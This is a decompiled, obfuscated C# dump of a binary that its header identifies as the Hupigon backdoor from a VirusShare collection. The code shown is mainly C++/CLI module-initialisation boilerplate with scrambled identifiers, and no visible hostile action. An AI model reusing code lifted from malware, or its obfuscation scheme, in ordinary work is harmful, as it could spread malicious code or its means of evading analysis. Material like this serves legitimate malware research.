// Decompiled with JetBrains decompiler
// Type: ¼.»
// Assembly: Cursor, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4B47A1CB-CB7F-48AE-B796-614CD24341D7
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Backdoor.Win32.Hupigon.mrzd-e0bc053b95ac2b5a84186f24c3dbfe3aa20a991cc2f8832185ade3d1ad9e510d.exe

using \u0082\u00BC;
using è;
using ø;
using PvLogiciels.dotNetProtector;
using System;
using System.Diagnostics;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.ConstrainedExecution;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;

namespace \u0082\u00BC
{
  internal class \u0082\u00BB
  {
    internal static Â \u00BE;
    [FixedAddressValueType]
    internal static int º;
    internal static __FnPtr<void ()> \u00A0;
    internal static Â \u0087;
    [FixedAddressValueType]
    internal static \u00AF.ª \u0081ç;
    internal static __FnPtr<void ()> \u0082\u00A3;
    [FixedAddressValueType]
    internal static bool \u0082\u0080;
    internal static __FnPtr<void ()> \u0081ë;
    internal static Â \u0081Ì;
    [FixedAddressValueType]
    internal static \u00AF.ª \u0081Ç;
    internal static __FnPtr<void ()> \u0081\u00AF;
    [FixedAddressValueType]
    internal static int \u0081\u0097;
    internal static __FnPtr<void ()> \u0081\u0088;
    internal static Â ó;
    [FixedAddressValueType]
    internal static \u00AF.ª í;
    internal static __FnPtr<void ()> \u0082\u00B1;
    internal static Â \u00B4;
    [FixedAddressValueType]
    internal static \u00AF.ª \u00A8;
    internal static __FnPtr<void ()> \u008F;
    internal static bool \u0081Í;
    internal static bool \u0082\u009B;
    internal static bool \u0082\u0089;
    internal static int \u0081ó;
    internal static uint \u0081á;
    internal static uint \u0081Ñ;
    internal static \u008E.ª \u0081Â;
    internal static uint \u0082µ;
    internal static uint \u0081\u00A0;
    internal static uint \u0081\u0093;
    internal static \u008E.ª \u0081\u0085;
    internal static bool ò;
    internal static Â Û;
    public static unsafe int** Ô;
    public static unsafe int** À;
    internal static __FnPtr<int ()> \u009F;
    [FixedAddressValueType]
    internal static uint \u0097;
    [FixedAddressValueType]
    internal static \u0082\u0098 \u0091;
    internal static __FnPtr<void ()> \u0082\u00B7;
    [FixedAddressValueType]
    internal static unsafe __FnPtr<void ()>* \u0082\u009F;
    internal static uint \u0082\u0097;
    internal static unsafe __FnPtr<void ()>* \u0082\u008D;
    internal static unsafe __FnPtr<void ()>* \u0082\u0085;
    [FixedAddressValueType]
    internal static unsafe __FnPtr<void ()>* \u0081ü;
    internal static int \u0081ô;
    internal static int \u0081ñ;
    internal static int \u0081í;
    internal static int \u0081æ;
    internal static int \u0081à;
    internal static int \u0081\u0082;
    internal static int \u0081Û;
    public static \u00A7 \u0081Ä;
    public static volatile uint é;
    public static \u00A7 â;
    public static \u009A Ý;
    public static volatile \u0094 \u0081\u00B7;
    public static \u009A \u0081\u00B2;
    public static unsafe void* \u0081\u00AE;
    public static volatile uint \u0081ª;
    public static unsafe __FnPtr<void ()>* \u0081\u00A4;
    public static unsafe __FnPtr<void ()>* \u0081\u00A1;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool Ï() => \u0082\u00BB.\u0081ª != uint.MaxValue;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool Ã() => \u0082\u00BB.\u0081ª == 1U;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u00B0() => \u0082\u00BB.\u0081ª == 0U;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u009C() => \u0082\u00BB.é != uint.MaxValue;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0090() => (\u0082\u00BB.\u0081ª != uint.MaxValue ? 1 : 0) == 0 || (\u0082\u00BB.é != uint.MaxValue ? 1 : 0) != 0 || \u0082\u00BB.\u0081ª != 1U && \u0082\u00BB.\u0081ª != 0U;

    internal static unsafe int \u0081(void* _param0)
    {
      GC.KeepAlive((object) int.MaxValue);
      return 0;
    }

    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u0082ª()
    {
      if (\u0082\u00BB.\u0081\u0085 != (\u008E.ª) 2)
        return \u0082\u00BB.\u0081\u0085 == (\u008E.ª) -1;
      void** voidPtr = (void**) &\u0082\u00BB.Û;
      if (ref \u0082\u00BB.Û < ref \u0082\u00BB.\u00BE)
      {
        while (*(int*) voidPtr == 0)
        {
          voidPtr += 4;
          if ((IntPtr) voidPtr >= ref \u0082\u00BB.\u00BE)
            goto label_5;
        }
        \u0082\u00BB.\u0081\u0085 = (\u008E.ª) -1;
        return true;
      }
label_5:
      \u0082\u00BB.\u0081\u0085 = (\u008E.ª) 0;
      return false;
    }

    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u0081Ô()
    {
      if (\u0082\u00BB.\u0081Â != (\u008E.ª) 2)
        return \u0082\u00BB.\u0081Â == (\u008E.ª) -1;
      void** voidPtr1 = (void**) &\u0082\u00BB.Ý;
      if (ref \u0082\u00BB.Ý < ref \u0082\u00BB.\u0081\u00B2)
      {
        while (*(int*) voidPtr1 == 0)
        {
          voidPtr1 += 4;
          if ((IntPtr) voidPtr1 >= ref \u0082\u00BB.\u0081\u00B2)
            goto label_5;
        }
        \u0082\u00BB.\u0081Â = (\u008E.ª) -1;
        return true;
      }
label_5:
      void** voidPtr2 = (void**) &\u0082\u00BB.â;
      if (ref \u0082\u00BB.â < ref \u0082\u00BB.\u0081Ä)
      {
        while (*(int*) voidPtr2 == 0)
        {
          voidPtr2 += 4;
          if ((IntPtr) voidPtr2 >= ref \u0082\u00BB.\u0081Ä)
            goto label_9;
        }
        \u0082\u00BB.\u0081Â = (\u008E.ª) -1;
        return true;
      }
label_9:
      \u0082\u00BB.\u0081Â = (\u008E.ª) 0;
      return false;
    }

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0082\u008C() => \u0082\u00BB.\u0082ª() && !\u0082\u00BB.\u0081Í || \u0082\u00BB.\u0081Ô() && !\u0082\u00BB.\u0082\u0089 && \u0082\u00BB.\u0081\u00B7 == (\u0094) 0;

    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0081\u00F7() => \u0082\u00BB.\u0082\u009B;

    internal static unsafe void \u0081â() => \u0082\u00BB.ù((__FnPtr<int (void*)>) (IntPtr) \u0082\u00BB.Ô, (void*) 0);

    internal static void \u0081Ó() => \u0082\u00BB.\u0081\u0097 = 0;

    internal static void \u0081\u00BC() => \u0082\u00BB.º = 0;

    internal static void \u0081\u00A5() => \u0082\u00BB.\u0082\u0080 = false;

    internal static void \u0081\u008F() => \u0082\u00BB.í = (\u00AF.ª) 0;

    internal static void \u00A3() => \u0082\u00BB.\u0081Ç = (\u00AF.ª) 0;

    internal static void \u00A6() => \u0082\u00BB.\u00A8 = (\u00AF.ª) 0;

    internal static void \u00AD() => \u0082\u00BB.\u0081ç = (\u00AF.ª) 0;

    [DebuggerStepThrough]
    internal static unsafe void \u008C([In] Õ* obj0)
    {
      \u0082\u00BB.\u00A4((Î*) obj0, "The C++ module failed to load during vtable initialization.\n");
      \u0082\u00BB.í = (\u00AF.ª) 1;
      \u0082\u00BB.\u0085((__FnPtr<void* ()>*) &\u0082\u00BB.\u0087, (__FnPtr<void* ()>*) &\u0082\u00BB.\u00B4);
      \u0082\u00BB.í = (\u00AF.ª) 2;
    }

    internal static unsafe void \u0082\u00B8([In] Õ* obj0)
    {
      \u0082\u00BB.\u00A4((Î*) obj0, "The C++ module failed to load while attempting to initialize the default appdomain.\n");
      \u0082\u00BB.\u0081â();
    }

    [DebuggerStepThrough]
    internal static unsafe void \u0082\u00A4([In] Õ* obj0)
    {
      \u0082\u00BB.\u00A4((Î*) obj0, "The C++ module failed to load during native initialization.\n");
      \u0082\u00BB.\u0081\u00B8();
      \u0082\u00BB.\u0082\u0089 = true;
      if (!\u0082\u00BB.\u0090())
        \u0082\u00BB.\u0081\u00BB(33);
      switch (\u0082\u00BB.\u0081\u00B7)
      {
        case (\u0094) 0:
          \u0082\u00BB.\u0081Ç = (\u00AF.ª) 1;
          \u0082\u00BB.\u0081\u00B7 = (\u0094) 1;
          if (\u0082\u00BB.\u0082\u009E((__FnPtr<int ()>*) &\u0082\u00BB.Ý, (__FnPtr<int ()>*) &\u0082\u00BB.\u0081\u00B2) != 0)
            \u0082\u00BB.\u00BB(\u0082\u00BB.\u009B((Î*) obj0));
          \u0082\u00BB.\u0093((__FnPtr<void ()>*) &\u0082\u00BB.â, (__FnPtr<void ()>*) &\u0082\u00BB.\u0081Ä);
          \u0082\u00BB.\u0081\u00B7 = (\u0094) 2;
          \u0082\u00BB.ò = true;
          \u0082\u00BB.\u0081Ç = (\u00AF.ª) 2;
          break;
        case (\u0094) 1:
          \u0082\u00BB.\u0081\u00BB(33);
          break;
      }
    }

    [DebuggerStepThrough]
    internal static unsafe void \u0082\u008F([In] Õ* obj0)
    {
      \u0082\u00BB.\u00A4((Î*) obj0, "The C++ module failed to load during process initialization.\n");
      \u0082\u00BB.\u00A8 = (\u00AF.ª) 1;
      \u0082\u00BB.\u0081\u0095();
      \u0082\u00BB.\u0085((__FnPtr<void* ()>*) &\u0082\u00BB.Û, (__FnPtr<void* ()>*) &\u0082\u00BB.\u00BE);
      \u0082\u00BB.\u00A8 = (\u00AF.ª) 2;
      \u0082\u00BB.\u0081Í = true;
    }

    [DebuggerStepThrough]
    internal static unsafe void \u0081û([In] Õ* obj0)
    {
      \u0082\u00BB.\u00A4((Î*) obj0, "The C++ module failed to load during appdomain initialization.\n");
      \u0082\u00BB.\u0081ç = (\u00AF.ª) 1;
      \u0082\u00BB.\u0081\u008A();
      \u0082\u00BB.\u0085((__FnPtr<void* ()>*) &\u0082\u00BB.\u0081Ì, (__FnPtr<void* ()>*) &\u0082\u00BB.ó);
      \u0082\u00BB.\u0081ç = (\u00AF.ª) 2;
    }

    [DebuggerStepThrough]
    internal static unsafe void \u0081å([In] Õ* obj0)
    {
      \u0082\u00BB.\u00A4((Î*) obj0, "The C++ module failed to load during registration for the unload events.\n");
      \u0082\u00BB.\u0081\u0087(new EventHandler(\u0082\u00BB.\u0081\u0090));
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [DebuggerStepThrough]
    internal static unsafe void \u0081\u00A9([In] Õ* obj0)
    {
      \u0082\u00BB.\u0082\u0080 = AppDomain.CurrentDomain.IsDefaultAppDomain();
      if (\u0082\u00BB.\u0082\u0080)
        \u0082\u00BB.\u0082\u009B = true;
      \u0082\u00BB.\u0081\u00A3();
      void* voidPtr1 = \u0082\u00BB.\u0081\u00BF();
      int num1 = 0;
      int num2 = 0;
      RuntimeHelpers.PrepareConstrainedRegions();
      try
      {
        while (num2 == 0)
        {
          try
          {
          }
          finally
          {
            IntPtr comparand = (IntPtr) 0;
            IntPtr num3 = (IntPtr) voidPtr1;
            // ISSUE: cast to a reference type
            void* voidPtr2 = (void*) Interlocked.CompareExchange((IntPtr&) ref \u0082\u00BB.\u0081\u00AE, num3, comparand);
            if ((IntPtr) voidPtr2 == IntPtr.Zero)
              num2 = 1;
            else if (voidPtr2 == voidPtr1)
            {
              num1 = 1;
              num2 = 1;
            }
          }
          if (num2 == 0)
            \u0082\u00BB.\u0081\u00B3(1000U);
        }
        if (!\u0082\u00BB.\u0082\u0080)
        {
          if (\u0082\u00BB.\u0082\u008C())
            \u0082\u00BB.\u0082\u00B8(obj0);
        }
      }
      finally
      {
        if (num1 == 0)
        {
          IntPtr num4 = (IntPtr) 0;
          // ISSUE: cast to a reference type
          Interlocked.Exchange((IntPtr&) ref \u0082\u00BB.\u0081\u00AE, num4);
        }
      }
      \u0082\u00BB.\u008C(obj0);
      if (\u0082\u00BB.\u0082\u0080)
      {
        \u0082\u00BB.\u0082\u00A4(obj0);
        \u0082\u00BB.\u0082\u008F(obj0);
      }
      \u0082\u00BB.\u0081û(obj0);
      \u0082\u00BB.\u0081\u0097 = 1;
      \u0082\u00BB.\u0081å(obj0);
    }

    internal static void \u0081Á() => \u0082\u00BB.Í();

    internal static unsafe int \u0081\u00B0(void* _param0)
    {
      \u0082\u00BB.\u0081\u0099();
      \u0082\u00BB.\u0081Í = false;
      if (\u0082\u00BB.ò)
      {
        \u0082\u00BB.ï();
        \u0082\u00BB.\u0081\u00B7 = (\u0094) 0;
        \u0082\u00BB.ò = false;
      }
      \u0082\u00BB.\u0082\u0089 = false;
      return 0;
    }

    internal static unsafe void \u0081\u009F()
    {
      if (!\u0082\u00BB.\u0082\u009B)
        return;
      if (AppDomain.CurrentDomain.IsDefaultAppDomain())
      {
        \u0082\u00BB.\u0081\u00B0((void*) 0);
      }
      else
      {
        // ISSUE: cast to a function pointer type
        \u0082\u00BB.ù((__FnPtr<int (void*)>) (IntPtr) \u0082\u00BB.À, (void*) 0);
      }
    }

    [PrePrepareMethod]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    internal static void \u0081\u0090(object _param0, EventArgs _param1)
    {
      if (\u0082\u00BB.\u0081\u0097 == 0 || Interlocked.Exchange(ref \u0082\u00BB.º, 1) != 0)
        return;
      int num = Interlocked.Decrement(ref \u0082\u00BB.\u0081ó) == 0 ? 1 : 0;
      \u0082\u00BB.Í();
      if ((byte) num == (byte) 0)
        return;
      \u0082\u00BB.\u0081\u009F();
    }

    [DebuggerStepThrough]
    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    internal static unsafe void þ([In] Õ* obj0, Exception _param1)
    {
      try
      {
        bool flag = Interlocked.Decrement(ref \u0082\u00BB.\u0081ó) == 0;
        \u0082\u00BB.\u0081Á();
        if (!flag)
          return;
        \u0082\u00BB.\u0081\u009F();
      }
      catch (Exception ex)
      {
        \u0082\u00BB.\u0081\u0096(_param1, ex);
      }
      catch
      {
        \u0082\u00BB.\u0081\u0096(_param1, (Exception) null);
      }
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    [DebuggerStepThrough]
    internal static unsafe void î([In] Õ* obj0)
    {
      bool flag = false;
      RuntimeHelpers.PrepareConstrainedRegions();
      try
      {
        \u0082\u00BB.\u00A4((Î*) obj0, "The C++ module failed to load.\n");
        RuntimeHelpers.PrepareConstrainedRegions();
        try
        {
        }
        finally
        {
          Interlocked.Increment(ref \u0082\u00BB.\u0081ó);
          flag = true;
        }
        \u0082\u00BB.\u0081\u00A9(obj0);
      }
      catch (Exception ex)
      {
        if (flag)
          \u0082\u00BB.þ(obj0, ex);
        \u0082\u00BB.\u00BB(\u0082\u00BB.\u009B((Î*) obj0), ex);
      }
      catch
      {
        if (flag)
          \u0082\u00BB.þ(obj0, (Exception) null);
        \u0082\u00BB.\u00BB(\u0082\u00BB.\u009B((Î*) obj0), (Exception) null);
      }
    }

    [DebuggerStepThrough]
    static unsafe \u0082\u00BB()
    {
      Õ õ;
      \u0082\u00BB.\u00D7(&õ);
      // ISSUE: fault handler
      try
      {
        \u0082\u00BB.î(&õ);
      }
      __fault
      {
        // ISSUE: method pointer
        // ISSUE: cast to a function pointer type
        \u0082\u00BB.\u0081\u00A6((__FnPtr<void (void*)>) __methodptr(Ê), (void*) &õ);
      }
      \u0082\u00BB.\u00B1((Î*) &õ);
    }

    internal static unsafe Õ* \u00D7([In] Õ* obj0)
    {
      \u0082\u00BB.\u00BC((Î*) obj0);
      return obj0;
    }

    internal static unsafe void Ê([In] Õ* obj0) => \u0082\u00BB.\u00B1((Î*) obj0);

    [DebuggerStepThrough]
    internal static unsafe Î* \u00BC([In] Î* obj0)
    {
      IntPtr num = (IntPtr) GCHandle.Alloc((object) null);
      *(int*) obj0 = (int) num.ToPointer();
      return obj0;
    }

    [DebuggerStepThrough]
    internal static unsafe void \u00B1([In] Î* obj0)
    {
      ((GCHandle) new IntPtr((void*) *(int*) obj0)).Free();
      *(int*) obj0 = 0;
    }

    [DebuggerStepThrough]
    internal static unsafe Î* \u00A4([In] Î* obj0, string _param1)
    {
      ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target = (object) _param1;
      return obj0;
    }

    internal static unsafe string \u009B([In] Î* obj0) => (string) ((GCHandle) new IntPtr((void*) *(int*) obj0)).Target;

    [STAThread]
    internal static unsafe int \u0082\u009C(string[] _param0)
    {
      try
      {
        \u0082\u00BB.ã(1);
        *\u0082\u00BB.É() = \u0082\u00BB.\u0081\u0082;
        *\u0082\u00BB.Ð() = \u0082\u00BB.\u0081à;
        \u0082\u00BB.\u0081þ();
        \u0082\u00BB.\u0082\u0081();
        if (\u0082\u00BB.\u0081í == -1)
          \u0082\u00BB.Ü(-1);
        \u0082º º;
        // ISSUE: cast to a reference type
        // ISSUE: explicit reference operation
        ^(int&) ref º = \u0082\u00BB.\u0081ñ;
        int num;
        char** chPtr1;
        char** chPtr2;
        if (\u0082\u00BB.Æ(&num, &chPtr1, &chPtr2, \u0082\u00BB.\u0081ô, &º) < 0)
          \u0082\u00BB.\u0081\u00BB(8);
        \u0082\u00BB.\u008A();
        return \u0082\u00BB.\u0081Ê(_param0);
      }
      catch (Exception ex) when (\u0082\u00BB.Ì((uint) Marshal.GetExceptionCode(), (\u0082\u00B2*) Marshal.GetExceptionPointers()) != 0)
      {
        return Marshal.GetExceptionCode();
      }
    }

    internal static unsafe void \u008A()
    {
      \u0082\u009A* objPtr1 = (\u0082\u009A*) \u0082\u00BB.Ö((sbyte*) 0);
      if (*(ushort*) objPtr1 != (ushort) 23117)
        return;
      \u0082\u00A7* objPtr2 = (\u0082\u00A7*) (*(int*) ((IntPtr) objPtr1 + 60) + (IntPtr) objPtr1);
      if (*(int*) objPtr2 != 17744 || *(ushort*) ((IntPtr) objPtr2 + 24) != (ushort) 267)
        return;
      if (*(ushort*) ((IntPtr) objPtr2 + 24 + 68) != (ushort) 3)
        \u0082\u00BB.ã(2);
      else
        \u0082\u00BB.ã(1);
    }

    [DebuggerStepThrough]
    internal static unsafe void \u0082\u0086()
    {
      object obj = new object();
      // ISSUE: cast to a reference type
      // ISSUE: explicit reference operation
      ^(int&) ref \u0082\u00BB.\u0091 = 0;
      \u0082\u00BB.\u00AC(&\u0082\u00BB.\u0091, obj);
    }

    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u0082\u00AC() => \u0082\u00BB.å(&\u0082\u00BB.\u0091) != null;

    [DebuggerStepThrough]
    internal static unsafe void \u0082\u00A0() => Monitor.Enter(\u0082\u00BB.å(&\u0082\u00BB.\u0091));

    [DebuggerStepThrough]
    internal static unsafe void \u0082\u0091() => Monitor.Exit(\u0082\u00BB.å(&\u0082\u00BB.\u0091));

    internal static void \u0082\u0083() => \u0082\u00BB.û((__FnPtr<void ()>) __methodptr(\u0081Þ));

    internal static unsafe void \u0081Þ() => \u0082\u00BB.Ñ(&\u0082\u00BB.\u0091);

    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u0081À()
    {
      bool flag = false;
      if (\u0082\u00BB.\u0082\u00AC())
      {
        Monitor.Enter(\u0082\u00BB.å(&\u0082\u00BB.\u0091));
        flag = true;
      }
      return flag;
    }

    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static unsafe bool \u0081\u00B9()
    {
      bool flag = false;
      if (\u0082\u00BB.\u0082\u00AC())
      {
        Monitor.Exit(\u0082\u00BB.å(&\u0082\u00BB.\u0091));
        flag = true;
      }
      return flag;
    }

    [DebuggerStepThrough]
    [return: MarshalAs(UnmanagedType.U1)]
    internal static bool \u0081\u00B1()
    {
      if (!\u0082\u00BB.\u0082\u00AC())
        \u0082\u00BB.\u0082\u0086();
      return \u0082\u00BB.\u0082\u00AC();
    }

    internal static unsafe int \u0081\u00A8(
      __FnPtr<void ()> _param0,
      uint* _param1,
      __FnPtr<void ()>** _param2,
      __FnPtr<void ()>** _param3)
    {
      // ISSUE: cast to a function pointer type
      __FnPtr<void ()> local1 = (__FnPtr<void ()>) 0;
      if (_param0 == null)
        return -1;
      int num1;
      if (\u0082\u00BB.\u0081À())
      {
        try
        {
          if (*_param1 - 1U < (uint) (*(int*) _param2 - *(int*) _param3) >> 2)
          {
            try
            {
              uint num2 = *_param1 * 4U;
              uint num3 = num2 >= 2048U ? 2048U : num2;
              IntPtr cb = new IntPtr((int) num2 + (int) num3);
              IntPtr num4 = Marshal.ReAllocHGlobal(new IntPtr((void*) *(int*) _param3), cb);
              __FnPtr<void ()>** local2 = _param2;
              IntPtr num5 = *(int*) local2 + ((IntPtr) num4.ToPointer() - *(int*) _param3);
              *(int*) local2 = (int) num5;
              *(int*) _param3 = (int) num4.ToPointer();
              uint num6 = *_param1;
              uint num7 = 512U >= num6 ? num6 : 512U;
              *_param1 = num6 + num7;
            }
            catch (OutOfMemoryException ex)
            {
              IntPtr cb = new IntPtr((int) *_param1 * 4 + 8);
              IntPtr num8 = Marshal.ReAllocHGlobal(new IntPtr((void*) *(int*) _param3), cb);
              __FnPtr<void ()>** local3 = _param2;
              IntPtr num9 = *(int*) local3 + ((IntPtr) num8.ToPointer() - *(int*) _param3);
              *(int*) local3 = (int) num9;
              *(int*) _param3 = (int) num8.ToPointer();
              uint* numPtr = _param1;
              int num10 = (int) *numPtr + 4;
              *numPtr = (uint) num10;
            }
          }
          *(int*) *(int*) _param2 = (int) _param0;
          __FnPtr<void ()>** local4 = _param2;
          int num11 = *(int*) local4 + 4;
          *(int*) local4 = num11;
          local1 = _param0;
        }
        catch (OutOfMemoryException ex)
        {
        }
        finally
        {
          \u0082\u00BB.\u0081\u00B9();
        }
        if (local1 != null)
        {
          num1 = 0;
          goto label_12;
        }
      }
      num1 = -1;
label_12:
      return num1;
    }

    internal static unsafe void \u0081\u0099()
    {
      if ((IntPtr) \u0082\u00BB.\u0082\u0085 == new IntPtr(-1) || (IntPtr) \u0082\u00BB.\u0082\u0085 == IntPtr.Zero || (IntPtr) \u0082\u00BB.\u0082\u008D == IntPtr.Zero)
        return;
      \u0082\u00BB.\u0082\u008D -= 4;
      if (\u0082\u00BB.\u0082\u008D >= \u0082\u00BB.\u0082\u0085)
      {
        do
        {
          if (*(int*) \u0082\u00BB.\u0082\u008D != 0)
          {
            // ISSUE: cast to a function pointer type
            // ISSUE: function pointer call
            __calli((__FnPtr<void ()>) *(int*) \u0082\u00BB.\u0082\u008D)();
          }
          \u0082\u00BB.\u0082\u008D -= 4;
        }
        while (\u0082\u00BB.\u0082\u008D >= \u0082\u00BB.\u0082\u0085);
      }
      Marshal.FreeHGlobal(new IntPtr((void*) \u0082\u00BB.\u0082\u0085));
    }

    [DebuggerStepThrough]
    internal static unsafe int \u0081\u0095()
    {
      if (!\u0082\u00BB.\u0081\u00B1())
        return 0;
      \u0082\u00BB.\u0082\u0085 = (__FnPtr<void ()>*) Marshal.AllocHGlobal(128).ToPointer();
      \u0082\u00BB.\u0082\u008D = \u0082\u00BB.\u0082\u0085;
      \u0082\u00BB.\u0082\u0097 = 32U;
      return 1;
    }

    internal static __FnPtr<int ()> \u0081\u0092(__FnPtr<int ()> _param0) => \u0082\u00BB.\u0081\u008B((__FnPtr<void ()>) _param0) != -1 ? _param0 : (__FnPtr<int ()>) 0;

    internal static unsafe int \u0081\u008B(__FnPtr<void ()> _param0) => \u0082\u00BB.\u0081\u00A8(_param0, &\u0082\u00BB.\u0082\u0097, &\u0082\u00BB.\u0082\u008D, &\u0082\u00BB.\u0082\u0085);

    [DebuggerStepThrough]
    internal static unsafe int \u0081\u008A()
    {
      if (\u0082\u00BB.\u0081\u00B1())
      {
        \u0082\u00BB.\u0082\u009F = (__FnPtr<void ()>*) Marshal.AllocHGlobal(128).ToPointer();
        \u0082\u00BB.\u0081ü = \u0082\u00BB.\u0082\u009F;
        \u0082\u00BB.\u0097 = 32U;
      }
      return 1;
    }

    internal static unsafe void Í()
    {
      if ((IntPtr) \u0082\u00BB.\u0082\u009F == new IntPtr(-1) || (IntPtr) \u0082\u00BB.\u0082\u009F == IntPtr.Zero)
        return;
      if ((IntPtr) \u0082\u00BB.\u0081ü == IntPtr.Zero)
        return;
      try
      {
        while (true)
        {
          do
          {
            \u0082\u00BB.\u0081ü -= 4;
            if (\u0082\u00BB.\u0081ü < \u0082\u00BB.\u0082\u009F)
              goto label_8;
          }
          while (*(int*) \u0082\u00BB.\u0081ü == 0);
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          __calli((__FnPtr<void ()>) *(int*) \u0082\u00BB.\u0081ü)();
        }
label_8:;
      }
      finally
      {
        Marshal.FreeHGlobal(new IntPtr((void*) \u0082\u00BB.\u0082\u009F));
      }
    }

    internal static __FnPtr<int ()> \u0081\u0080(__FnPtr<int ()> _param0) => \u0082\u00BB.û((__FnPtr<void ()>) _param0) != -1 ? _param0 : (__FnPtr<int ()>) 0;

    [DebuggerStepThrough]
    internal static unsafe int û(__FnPtr<void ()> _param0) => \u0082\u00BB.\u0081\u00A8(_param0, &\u0082\u00BB.\u0097, &\u0082\u00BB.\u0081ü, &\u0082\u00BB.\u0082\u009F);

    [DebuggerStepThrough]
    internal static unsafe void ö([In] \u0082\u0098* obj0, object _param1)
    {
      *(int*) obj0 = 0;
      \u0082\u00BB.\u00AC(obj0, _param1);
    }

    [DebuggerStepThrough]
    internal static unsafe object å([In] \u0082\u0098* obj0)
    {
      ValueType valueType = \u0082\u00BB.Á(obj0);
      return valueType != null ? ((GCHandle) valueType).Target : (object) null;
    }

    internal static unsafe void Ñ([In] \u0082\u0098* obj0)
    {
      ValueType valueType = \u0082\u00BB.Á(obj0);
      if (valueType == null)
        return;
      ((GCHandle) valueType).Free();
      *(int*) obj0 = 0;
    }

    [DebuggerStepThrough]
    internal static unsafe ValueType Á([In] \u0082\u0098* obj0)
    {
      uint num = (uint) *(int*) obj0;
      return num != 0U ? (ValueType) GCHandle.FromIntPtr(new IntPtr((void*) num)) : (ValueType) null;
    }

    [DebuggerStepThrough]
    internal static unsafe void \u00AC([In] \u0082\u0098* obj0, object _param1)
    {
      ValueType valueType = \u0082\u00BB.Á(obj0);
      if (valueType == null)
      {
        IntPtr intPtr = GCHandle.ToIntPtr(GCHandle.Alloc(_param1));
        *(int*) obj0 = (int) intPtr.ToPointer();
      }
      else
        ((GCHandle) valueType).Target = _param1;
    }

    [DebuggerStepThrough]
    internal static unsafe int \u0082\u009E(__FnPtr<int ()>* _param0, __FnPtr<int ()>* _param1)
    {
      int num1 = 0;
      if (_param0 < _param1)
      {
        while (num1 == 0)
        {
          uint num2 = (uint) *(int*) _param0;
          if (num2 != 0U)
          {
            // ISSUE: cast to a function pointer type
            // ISSUE: function pointer call
            num1 = __calli((__FnPtr<int ()>) (int) num2)();
          }
          _param0 += 4;
          if (_param0 >= _param1)
            break;
        }
      }
      return num1;
    }

    [DebuggerStepThrough]
    internal static unsafe void \u0093(__FnPtr<void ()>* _param0, __FnPtr<void ()>* _param1)
    {
      if (_param0 >= _param1)
        return;
      do
      {
        uint num = (uint) *(int*) _param0;
        if (num != 0U)
        {
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          __calli((__FnPtr<void ()>) (int) num)();
        }
        _param0 += 4;
      }
      while (_param0 < _param1);
    }

    [DebuggerStepThrough]
    internal static ModuleHandle \u0082\u0093() => typeof (\u0082\u0090).Module.ModuleHandle;

    [DebuggerStepThrough]
    internal static unsafe void \u0085(__FnPtr<void* ()>* _param0, __FnPtr<void* ()>* _param1)
    {
      if (_param0 >= _param1)
        return;
      do
      {
        uint num = (uint) *(int*) _param0;
        if (num != 0U)
        {
          // ISSUE: cast to a function pointer type
          // ISSUE: function pointer call
          void* voidPtr = __calli(\u0082\u00BB.\u0083((__FnPtr<void* ()>) (int) num))();
        }
        _param0 += 4;
      }
      while (_param0 < _param1);
    }

    [DebuggerStepThrough]
    internal static unsafe __FnPtr<void* ()> \u0083(__FnPtr<void* ()> _param0) => (__FnPtr<void* ()>) (IntPtr) \u0082\u00BB.\u0082\u0093().ResolveMethodHandle((int) _param0).GetFunctionPointer().ToPointer();

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    internal static unsafe void \u0081\u00A6(__FnPtr<void (void*)> _param0, void* _param1)
    {
      try
      {
        void* voidPtr = _param1;
        // ISSUE: function pointer call
        __calli(_param0)(voidPtr);
      }
      catch (Exception ex) when (\u0082\u00BB.Ä((\u0082\u00B2*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    internal static unsafe void \u0082\u0099(__FnPtr<void (void*)> _param0, void* _param1)
    {
      try
      {
        void* voidPtr = _param1;
        // ISSUE: function pointer call
        __calli(_param0)(voidPtr);
      }
      catch (Exception ex) when (\u0082\u00BB.Ä((\u0082\u00B2*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]
    internal static unsafe void \u0082\u0092(
      __FnPtr<void (void*, uint, int, __FnPtr<void (void*)>)> _param0,
      void* _param1,
      uint _param2,
      int _param3,
      __FnPtr<void (void*)> _param4)
    {
      try
      {
        void* voidPtr = _param1;
        int num1 = (int) _param2;
        int num2 = _param3;
        __FnPtr<void (void*)> local = _param4;
        // ISSUE: cast to a function pointer type
        // ISSUE: function pointer call
        __calli(_param0)((__FnPtr<void (void*)>) (IntPtr) voidPtr, num1, (uint) num2, (void*) local);
      }
      catch (Exception ex) when (\u0082\u00BB.Ä((\u0082\u00B2*) Marshal.GetExceptionPointers()) != 0)
      {
      }
    }

    internal static void \u0082\u0081()
    {
      if (\u0082\u00BB.\u0081æ != 0)
        return;
      // ISSUE: method pointer
      // ISSUE: cast to a function pointer type
      \u0082\u00BB.\u00BD((__FnPtr<int (\u0081î*)>) __methodptr(\u0081ú));
